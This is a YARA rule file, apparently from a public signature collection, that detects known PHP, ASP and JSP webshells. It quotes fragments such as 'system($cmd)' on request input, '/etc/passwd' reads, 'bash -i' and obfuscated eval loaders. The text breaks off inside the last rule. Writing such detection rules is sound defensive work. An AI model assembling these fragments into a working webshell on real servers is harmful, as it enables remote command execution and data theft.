rule WebShell_c99_locus7s {
	meta:
		description = "PHP Webshells Github Archive - file c99_locus7s.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "d413d4700daed07561c9f95e1468fb80238fbf3c"
		id = "f92fe5a2-e465-56ed-a77b-b32ea4c2c105"
	strings:
		$s8 = "$encoded = base64_encode(file_get_contents($d.$f)); " fullword
		$s9 = "$file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y"
		$s10 = "else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sq"
		$s11 = "$c99sh_sourcesurl = \"http://locus7s.com/\"; //Sources-server " fullword
		$s19 = "$nixpwdperpage = 100; // Get first N lines from /etc/passwd " fullword
	condition:
		2 of them
}
rule WebShell_JspWebshell_1_2 {
	meta:
		description = "PHP Webshells Github Archive - file JspWebshell_1.2.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "0bed4a1966117dd872ac9e8dceceb54024a030fa"
		id = "dfd8c88d-4fe2-5786-9d71-65dba525c358"
	strings:
		$s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword
		$s1 = "String password=request.getParameter(\"password\");" fullword
		$s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java."
		$s7 = "String editfile=request.getParameter(\"editfile\");" fullword
		$s8 = "//String tempfilename=request.getParameter(\"file\");" fullword
		$s12 = "password = (String)session.getAttribute(\"password\");" fullword
	condition:
		3 of them
}
rule WebShell_safe0ver {
	meta:
		description = "PHP Webshells Github Archive - file safe0ver.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "366639526d92bd38ff7218b8539ac0f154190eb8"
		id = "a7fc8c89-f7a1-5958-823a-763dedb3066d"
	strings:
		$s3 = "$scriptident = \"$scriptTitle By Evilc0der.com\";" fullword
		$s4 = "while (file_exists(\"$lastdir/newfile$i.txt\"))" fullword
		$s5 = "else { /* <!-- Then it must be a File... --> */" fullword
		$s7 = "$contents .= htmlentities( $line ) ;" fullword
		$s8 = "<br><p><br>Safe Mode ByPAss<p><form method=\"POST\">" fullword
		$s14 = "elseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ " fullword
		$s20 = "/* <!-- End of Actions --> */" fullword
	condition:
		3 of them
}
rule WebShell_Uploader {
	meta:
		description = "PHP Webshells Github Archive - file Uploader.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "e216c5863a23fde8a449c31660fd413d77cce0b7"
		id = "c68e15d9-865e-5269-a91c-00619fe76305"
	strings:
		$s1 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword
	condition:
		all of them
}
rule WebShell_php_webshells_kral {
	meta:
		description = "PHP Webshells Github Archive - file kral.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "4cd1d1a2fd448cecc605970e3a89f3c2e5c80dfc"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "$adres=gethostbyname($ip);" fullword
		$s3 = "curl_setopt($ch,CURLOPT_POSTFIELDS,\"domain=\".$site);" fullword
		$s4 = "$ekle=\"/index.php?option=com_user&view=reset&layout=confirm\";" fullword
		$s16 = "echo $son.' <br> <font color=\"green\">Access</font><br>';" fullword
		$s17 = "<p>kodlama by <a href=\"mailto:priv8coder@gmail.com\">BLaSTER</a><br /"
		$s20 = "<p><strong>Server listeleyici</strong><br />" fullword
	condition:
		2 of them
}
rule WebShell_cgitelnet {
	meta:
		description = "PHP Webshells Github Archive - file cgitelnet.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "72e5f0e4cd438e47b6454de297267770a36cbeb3"
		id = "b02d8549-ebfe-522c-9a6d-8657273da3ed"
	strings:
		$s9 = "# Author Homepage: http://www.rohitab.com/" fullword
		$s10 = "elsif($Action eq \"command\") # user wants to run a command" fullword
		$s18 = "# in a command line on Windows NT." fullword
		$s20 = "print \"Transfered $TargetFileSize Bytes.<br>\";" fullword
	condition:
		2 of them
}
rule WebShell_simple_backdoor_2 {
	meta:
		description = "PHP Webshells Github Archive - file simple-backdoor.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		old_rule_name = "WebShell_simple_backdoor"
		hash = "edcd5157a68fa00723a506ca86d6cbb8884ef512"
		id = "faddd38e-d0c6-5299-9983-53351af1ece5"
	strings:
		$s0 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->" fullword
		$s1 = "<!--    http://michaeldaw.org   2006    -->" fullword
		$s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
		$s3 = "        echo \"</pre>\";" fullword
		$s4 = "        $cmd = ($_REQUEST['cmd']);" fullword
		$s5 = "        echo \"<pre>\";" fullword
		$s6 = "if(isset($_REQUEST['cmd'])){" fullword
		$s7 = "        die;" fullword
		$s8 = "        system($cmd);" fullword
	condition:
		all of them
}
rule WebShell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2_2 {
	meta:
		description = "PHP Webshells Github Archive - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "8fdd4e0e87c044177e9e1c97084eb5b18e2f1c25"
		id = "a504442f-85f2-55a1-8a07-1e0faccf8bc0"
	strings:
		$s1 = "<option value=\"/etc/passwd\">Get /etc/passwd</option>" fullword
		$s3 = "xb5@hotmail.com</FONT></CENTER></B>\");" fullword
		$s4 = "$v = @ini_get(\"open_basedir\");" fullword
		$s6 = "by PHP Emperor<xb5@hotmail.com>" fullword
	condition:
		2 of them
}
rule WebShell_NTDaddy_v1_9 {
	meta:
		description = "PHP Webshells Github Archive - file NTDaddy v1.9.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "79519aa407fff72b7510c6a63c877f2e07d7554b"
		id = "a175fd28-5dc2-5827-87f0-4117e889e90e"
	strings:
		$s2 = "|     -obzerve : mr_o@ihateclowns.com |" fullword
		$s6 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword
		$s13 = "<form action=ntdaddy.asp method=post>" fullword
		$s17 = "response.write(\"<ERROR: THIS IS NOT A TEXT FILE>\")" fullword
	condition:
		2 of them
}
rule WebShell_lamashell {
	meta:
		description = "PHP Webshells Github Archive - file lamashell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "b71181e0d899b2b07bc55aebb27da6706ea1b560"
		id = "60e39eed-baa2-5999-8560-0a0242ce2608"
	strings:
		$s0 = "if(($_POST['exe']) == \"Execute\") {" fullword
		$s8 = "$curcmd = $_POST['king'];" fullword
		$s16 = "\"http://www.w3.org/TR/html4/loose.dtd\">" fullword
		$s18 = "<title>lama's'hell v. 3.0</title>" fullword
		$s19 = "_|_  O    _    O  _|_"
		$s20 = "$curcmd = \"ls -lah\";" fullword
	condition:
		2 of them
}
rule WebShell_Simple_PHP_backdoor_by_DK {
	meta:
		description = "PHP Webshells Github Archive - file Simple_PHP_backdoor_by_DK.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "03f6215548ed370bec0332199be7c4f68105274e"
		id = "2c424714-1d2c-5b89-b1bc-a201e37a0a5d"
	strings:
		$s0 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->" fullword
		$s1 = "<!--    http://michaeldaw.org   2006    -->" fullword
		$s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
		$s6 = "if(isset($_REQUEST['cmd'])){" fullword
		$s8 = "system($cmd);" fullword
	condition:
		2 of them
}
rule WebShell_Moroccan_Spamers_Ma_EditioN_By_GhOsT {
	meta:
		description = "PHP Webshells Github Archive - file Moroccan Spamers Ma-EditioN By GhOsT.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "31e5473920a2cc445d246bc5820037d8fe383201"
		id = "4fa9ce70-d300-55fe-bf98-636f026317ec"
	strings:
		$s4 = "$content = chunk_split(base64_encode($content)); " fullword
		$s12 = "print \"Sending mail to $to....... \"; " fullword
		$s16 = "if (!$from && !$subject && !$message && !$emaillist){ " fullword
	condition:
		all of them
}
rule WebShell_C99madShell_v__2_0_madnet_edition {
	meta:
		description = "PHP Webshells Github Archive - file C99madShell v. 2.0 madnet edition.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "f99f8228eb12746847f54bad45084f19d1a7e111"
		id = "51db0495-14f3-527e-865b-1405db57ff27"
	strings:
		$s0 = "$md5_pass = \"\"; //If no pass then hash" fullword
		$s1 = "eval(gzinflate(base64_decode('"
		$s2 = "$pass = \"\";  //Pass" fullword
		$s3 = "$login = \"\"; //Login" fullword
		$s4 = "//Authentication" fullword
	condition:
		all of them
}
rule WebShell_CmdAsp_asp_php {
	meta:
		description = "PHP Webshells Github Archive - file CmdAsp.asp.php.txt"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "cb18e1ac11e37e236e244b96c2af2d313feda696"
		id = "184b1731-31a9-5040-aa25-d145e8064758"
	strings:
		$s1 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword
		$s4 = "' Author: Maceo <maceo @ dogmile.com>" fullword
		$s5 = "' -- Use a poor man's pipe ... a temp file -- '" fullword
		$s6 = "' --------------------o0o--------------------" fullword
		$s8 = "' File: CmdAsp.asp" fullword
		$s11 = "<-- CmdAsp.asp -->" fullword
		$s14 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
		$s16 = "Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")" fullword
		$s19 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
	condition:
		4 of them
}
rule WebShell_NCC_Shell {
	meta:
		description = "PHP Webshells Github Archive - file NCC-Shell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "64d4495875a809b2730bd93bec2e33902ea80a53"
		id = "3a2dab3d-faf0-52a5-b114-db402885c618"
	strings:
		$s0 = " if (isset($_FILES['probe']) and ! $_FILES['probe']['error']) {" fullword
		$s1 = "<b>--Coded by Silver" fullword
		$s2 = "<title>Upload - Shell/Datei</title>" fullword
		$s8 = "<a href=\"http://www.n-c-c.6x.to\" target=\"_blank\">-->NCC<--</a></center></b><"
		$s14 = "~|_Team .:National Cracker Crew:._|~<br>" fullword
		$s18 = "printf(\"Sie ist %u Bytes gro" fullword
	condition:
		3 of them
}
rule WebShell_php_webshells_README {
	meta:
		description = "PHP Webshells Github Archive - file README.md"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "ef2c567b4782c994db48de0168deb29c812f7204"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "Common php webshells. Do not host the file(s) in your server!" fullword
		$s1 = "php-webshells" fullword
	condition:
		all of them
}
rule WebShell_backupsql {
	meta:
		description = "PHP Webshells Github Archive - file backupsql.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "863e017545ec8e16a0df5f420f2d708631020dd4"
		id = "15d6e967-1e53-53b4-a2cf-7786452495d4"
	strings:
		$s0 = "$headers .= \"\\nMIME-Version: 1.0\\n\" .\"Content-Type: multipart/mixed;\\n\" ."
		$s1 = "$ftpconnect = \"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog"
		$s2 = "* as email attachment, or send to a remote ftp server by" fullword
		$s16 = "* Neagu Mihai<neagumihai@hotmail.com>" fullword
		$s17 = "$from    = \"Neu-Cool@email.com\";  // Who should the emails be sent from?, may "
	condition:
		2 of them
}
rule WebShell_AK_74_Security_Team_Web_Shell_Beta_Version {
	meta:
		description = "PHP Webshells Github Archive - file AK-74 Security Team Web Shell Beta Version.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "c90b0ba575f432ecc08f8f292f3013b5532fe2c4"
		id = "e93a6ac3-080f-53d3-8368-b9feb509a2ea"
	strings:
		$s8 = "- AK-74 Security Team Web Site: www.ak74-team.net" fullword
		$s9 = "<b><font color=#830000>8. X Forwarded For IP - </font></b><font color=#830000>'."
		$s10 = "<b><font color=#83000>Execute system commands!</font></b>" fullword
	condition:
		1 of them
}
rule WebShell_php_webshells_cpanel {
	meta:
		description = "PHP Webshells Github Archive - file cpanel.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "433dab17106b175c7cf73f4f094e835d453c0874"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "function ftp_check($host,$user,$pass,$timeout){" fullword
		$s3 = "curl_setopt($ch, CURLOPT_URL, \"http://$host:2082\");" fullword
		$s4 = "[ user@alturks.com ]# info<b><br><font face=tahoma><br>" fullword
		$s12 = "curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);" fullword
		$s13 = "Powerful tool , ftp and cPanel brute forcer , php 5.2.9 safe_mode & open_basedir"
		$s20 = "<br><b>Please enter your USERNAME and PASSWORD to logon<br>" fullword
	condition:
		2 of them
}
rule WebShell_accept_language {
	meta:
		description = "PHP Webshells Github Archive - file accept_language.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "180b13576f8a5407ab3325671b63750adbcb62c9"
		id = "343ed2a4-4bed-5e73-8d05-f9573b0147af"
	strings:
		$s0 = "<?php passthru(getenv(\"HTTP_ACCEPT_LANGUAGE\")); echo '<br> by q1w2e3r4'; ?>" fullword
	condition:
		all of them
}
rule WebShell_php_webshells_529 {
	meta:
		description = "PHP Webshells Github Archive - file 529.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "ba3fb2995528307487dff7d5b624d9f4c94c75d3"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<p>More: <a href=\"/\">Md5Cracking.Com Crew</a> " fullword
		$s7 = "href=\"/\" title=\"Securityhouse\">Security House - Shell Center - Edited By Kin"
		$s9 = "echo '<PRE><P>This is exploit from <a " fullword
		$s10 = "This Exploit Was Edited By KingDefacer" fullword
		$s13 = "safe_mode and open_basedir Bypass PHP 5.2.9 " fullword
		$s14 = "$hardstyle = explode(\"/\", $file); " fullword
		$s20 = "while($level--) chdir(\"..\"); " fullword
	condition:
		2 of them
}
rule WebShell_STNC_WebShell_v0_8 {
	meta:
		description = "PHP Webshells Github Archive - file STNC WebShell v0.8.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "52068c9dff65f1caae8f4c60d0225708612bb8bc"
		id = "5dc300a2-9965-52e3-a382-b8d327eb7029"
	strings:
		$s3 = "if(isset($_POST[\"action\"])) $action = $_POST[\"action\"];" fullword
		$s8 = "elseif(fe(\"system\")){ob_start();system($s);$r=ob_get_contents();ob_end_clean()"
		$s13 = "{ $pwd = $_POST[\"pwd\"]; $type = filetype($pwd); if($type === \"dir\")chdir($pw"
	condition:
		2 of them
}
rule WebShell_php_webshells_tryag {
	meta:
		description = "PHP Webshells Github Archive - file tryag.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "42d837e9ab764e95ed11b8bd6c29699d13fe4c41"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "<title>TrYaG Team - TrYaG.php - Edited By KingDefacer</title>" fullword
		$s3 = "$tabledump = \"DROP TABLE IF EXISTS $table;\\n\"; " fullword
		$s6 = "$string = !empty($_POST['string']) ? $_POST['string'] : 0; " fullword
		$s7 = "$tabledump .= \"CREATE TABLE $table (\\n\"; " fullword
		$s14 = "echo \"<center><div id=logostrip>Edit file: $editfile </div><form action='$REQUE"
	condition:
		3 of them
}
rule WebShell_dC3_Security_Crew_Shell_PRiV_2 {
	meta:
		description = "PHP Webshells Github Archive - file dC3 Security Crew Shell PRiV.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "9077eb05f4ce19c31c93c2421430dd3068a37f17"
		id = "1d4a95c4-8128-504d-958f-dcc5c68f4975"
	strings:
		$s0 = "@rmdir($_GET['file']) or die (\"[-]Error deleting dir!\");" fullword
		$s9 = "header(\"Last-Modified: \".date(\"r\",filemtime(__FILE__)));" fullword
		$s13 = "header(\"Content-type: image/gif\");" fullword
		$s14 = "@copy($file,$to) or die (\"[-]Error copying file!\");" fullword
		$s20 = "if (isset($_GET['rename_all'])) {" fullword
	condition:
		3 of them
}
rule WebShell_qsd_php_backdoor {
	meta:
		description = "PHP Webshells Github Archive - file qsd-php-backdoor.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "4856bce45fc5b3f938d8125f7cdd35a8bbae380f"
		id = "f8208851-159c-5d0b-91ad-478aeb4fc9fd"
	strings:
		$s1 = "// A robust backdoor script made by Daniel Berliner - http://www.qsdconsulting.c"
		$s2 = "if(isset($_POST[\"newcontent\"]))" fullword
		$s3 = "foreach($parts as $val)//Assemble the path back together" fullword
		$s7 = "$_POST[\"newcontent\"]=urldecode(base64_decode($_POST[\"newcontent\"]));" fullword
	condition:
		2 of them
}
rule WebShell_php_webshells_spygrup {
	meta:
		description = "PHP Webshells Github Archive - file spygrup.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "12f9105332f5dc5d6360a26706cd79afa07fe004"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s2 = "kingdefacer@msn.com</FONT></CENTER></B>\");" fullword
		$s6 = "if($_POST['root']) $root = $_POST['root'];" fullword
		$s12 = "\".htmlspecialchars($file).\" Bu Dosya zaten Goruntuleniyor<kingdefacer@msn.com>" fullword
		$s18 = "By KingDefacer From Spygrup.org>" fullword
	condition:
		3 of them
}
rule WebShell_Web_shell__c_ShAnKaR {
	meta:
		description = "PHP Webshells Github Archive - file Web-shell (c)ShAnKaR.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "3dd4f25bd132beb59d2ae0c813373c9ea20e1b7a"
		id = "966f5580-21c5-5ecf-b500-bde3d1ba4494"
	strings:
		$s0 = "header(\"Content-Length: \".filesize($_POST['downf']));" fullword
		$s5 = "if($_POST['save']==0){echo \"<textarea cols=70 rows=10>\".htmlspecialchars($dump"
		$s6 = "write(\"#\\n#Server : \".getenv('SERVER_NAME').\"" fullword
		$s12 = "foreach(@file($_POST['passwd']) as $fed)echo $fed;" fullword
	condition:
		2 of them
}
rule WebShell_Ayyildiz_Tim___AYT__Shell_v_2_1_Biz {
	meta:
		description = "PHP Webshells Github Archive - file Ayyildiz Tim  -AYT- Shell v 2.1 Biz.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "5fe8c1d01dc5bc70372a8a04410faf8fcde3cb68"
		id = "fdd9bae9-80f3-5200-b922-e7d194009af8"
	strings:
		$s7 = "<meta name=\"Copyright\" content=TouCh By iJOo\">" fullword
		$s11 = "directory... Trust me - it works :-) */" fullword
		$s15 = "/* ls looks much better with ' -F', IMHO. */" fullword
		$s16 = "} else if ($command == 'ls') {" fullword
	condition:
		3 of them
}
rule WebShell_Gamma_Web_Shell {
	meta:
		description = "PHP Webshells Github Archive - file Gamma Web Shell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "7ef773df7a2f221468cc8f7683e1ace6b1e8139a"
		id = "43b4fc9f-8897-5553-8846-29d307efa885"
	strings:
		$s4 = "$ok_commands = ['ls', 'ls -l', 'pwd', 'uptime'];" fullword
		$s8 = "### Gamma Group <http://www.gammacenter.com>" fullword
		$s15 = "my $error = \"This command is not available in the restricted mode.\\n\";" fullword
		$s20 = "my $command = $self->query('command');" fullword
	condition:
		2 of them
}
rule WebShell_php_webshells_aspydrv {
	meta:
		description = "PHP Webshells Github Archive - file aspydrv.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "3d8996b625025dc549d73cdb3e5fa678ab35d32a"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files"
		$s1 = "nPos = InstrB(nPosEnd, biData, CByteString(\"Content-Type:\"))" fullword
		$s3 = "Document.frmSQL.mPage.value = Document.frmSQL.mPage.value - 1" fullword
		$s17 = "If request.querystring(\"getDRVs\")=\"@\" then" fullword
		$s20 = "' ---Copy Too Folder routine Start" fullword
	condition:
		3 of them
}
rule WebShell_JspWebshell_1_2_2 {
	meta:
		description = "PHP Webshells Github Archive - file JspWebshell 1.2.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "184fc72b51d1429c44a4c8de43081e00967cf86b"
		id = "659f5c7d-0a9c-554d-a0ad-e3bcb8c5a1e9"
	strings:
		$s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword
		$s3 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java."
		$s4 = "// String tempfilepath=request.getParameter(\"filepath\");" fullword
		$s15 = "endPoint=random1.getFilePointer();" fullword
		$s20 = "if (request.getParameter(\"command\") != null) {" fullword
	condition:
		3 of them
}
rule WebShell_g00nshell_v1_3 {
	meta:
		description = "PHP Webshells Github Archive - file g00nshell-v1.3.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "70fe072e120249c9e2f0a8e9019f984aea84a504"
		id = "61a09576-7e62-5a30-a52c-492b81b96322"
	strings:
		$s10 = "#To execute commands, simply include ?cmd=___ in the url. #" fullword
		$s15 = "$query = \"SHOW COLUMNS FROM \" . $_GET['table'];" fullword
		$s16 = "$uakey = \"724ea055b975621b9d679f7077257bd9\"; // MD5 encoded user-agent" fullword
		$s17 = "echo(\"<form method='GET' name='shell'>\");" fullword
		$s18 = "echo(\"<form method='post' action='?act=sql'>\");" fullword
	condition:
		2 of them
}
rule WebShell_WinX_Shell_2 {
	meta:
		description = "PHP Webshells Github Archive - file WinX Shell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		old_rule_name = "WebShell_WinX_Shell"
		hash = "a94d65c168344ad9fa406d219bdf60150c02010e"
		id = "ebad4f2e-96c3-5cb7-b228-de3a6a39ae55"
	strings:
		$s4 = "// It's simple shell for all Win OS." fullword
		$s5 = "//------- [netstat -an] and [ipconfig] and [tasklist] ------------" fullword
		$s6 = "<html><head><title>-:[GreenwooD]:- WinX Shell</title></head>" fullword
		$s13 = "// Created by greenwood from n57" fullword
		$s20 = " if (is_uploaded_file($userfile)) {" fullword
	condition:
		3 of them
}
rule WebShell_PHANTASMA {
	meta:
		description = "PHP Webshells Github Archive - file PHANTASMA.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "cd12d42abf854cd34ff9e93a80d464620af6d75e"
		id = "b36a7dbb-7d40-5fca-8409-c8822298005c"
	strings:
		$s12 = "\"    printf(\\\"Usage: %s [Host] <port>\\\\n\\\", argv[0]);\\n\" ." fullword
		$s15 = "if ($portscan != \"\") {" fullword
		$s16 = "echo \"<br>Banner: $get <br><br>\";" fullword
		$s20 = "$dono = get_current_user( );" fullword
	condition:
		3 of them
}
rule WebShell_php_webshells_cw {
	meta:
		description = "PHP Webshells Github Archive - file cw.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "e65e0670ef6edf0a3581be6fe5ddeeffd22014bf"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "// Dump Database [pacucci.com]" fullword
		$s2 = "$dump = \"-- Database: \".$_POST['db'] .\" \\n\";" fullword
		$s7 = "$aids = passthru(\"perl cbs.pl \".$_POST['connhost'].\" \".$_POST['connport']);" fullword
		$s8 = "<b>IP:</b> <u>\" . $_SERVER['REMOTE_ADDR'] .\"</u> - Server IP:</b> <a href='htt"
		$s14 = "$dump .= \"-- Cyber-Warrior.Org\\n\";" fullword
		$s20 = "if(isset($_POST['doedit']) && $_POST['editfile'] != $dir)" fullword
	condition:
		3 of them
}
rule WebShell_php_include_w_shell {
	meta:
		description = "PHP Webshells Github Archive - file php-include-w-shell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "1a7f4868691410830ad954360950e37c582b0292"
		id = "a80ca446-6612-51b4-99a7-8a8d8e6ee196"
	strings:
		$s13 = "# dump variables (DEBUG SCRIPT) NEEDS MODIFINY FOR B64 STATUS!!" fullword
		$s17 = "\"phpshellapp\" => \"export TERM=xterm; bash -i\"," fullword
		$s19 = "else if($numhosts == 1) $strOutput .= \"On 1 host..\\n\";" fullword
	condition:
		1 of them
}
rule WebShell_mysql_tool {
	meta:
		description = "PHP Webshells Github Archive - file mysql_tool.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "c9cf8cafcd4e65d1b57fdee5eef98f0f2de74474"
		id = "a22a0a5c-a686-517e-b1f9-279edab0616b"
	strings:
		$s12 = "$dump .= \"-- Dumping data for table '$table'\\n\";" fullword
		$s20 = "$dump .= \"CREATE TABLE $table (\\n\";" fullword
	condition:
		2 of them
}
rule WebShell_PhpSpy_Ver_2006 {
	meta:
		description = "PHP Webshells Github Archive - file PhpSpy Ver 2006.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "34a89e0ab896c3518d9a474b71ee636ca595625d"
		id = "adbb1963-31c8-5540-a679-c75b1101c163"
	strings:
		$s2 = "var_dump(@$shell->RegRead($_POST['readregname']));" fullword
		$s12 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname."
		$s19 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32"
		$s20 = "$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe'"
	condition:
		1 of them
}
rule WebShell_ZyklonShell {
	meta:
		description = "PHP Webshells Github Archive - file ZyklonShell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "3fa7e6f3566427196ac47551392e2386a038d61c"
		id = "4d7ff3e5-4940-52c8-b045-5db1523f70c2"
	strings:
		$s0 = "The requested URL /Nemo/shell/zyklonshell.txt was not found on this server.<P>" fullword
		$s1 = "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">" fullword
		$s2 = "<TITLE>404 Not Found</TITLE>" fullword
		$s3 = "<H1>Not Found</H1>" fullword
	condition:
		all of them
}
rule WebShell_php_webshells_myshell_2 {
	meta:
		description = "PHP Webshells Github Archive - file myshell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		old_rule_name = "WebShell_php_webshells_myshell"
		hash = "5bd52749872d1083e7be076a5e65ffcde210e524"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "if($ok==false &&$status && $autoErrorTrap)system($command . \" 1> /tmp/outpu"
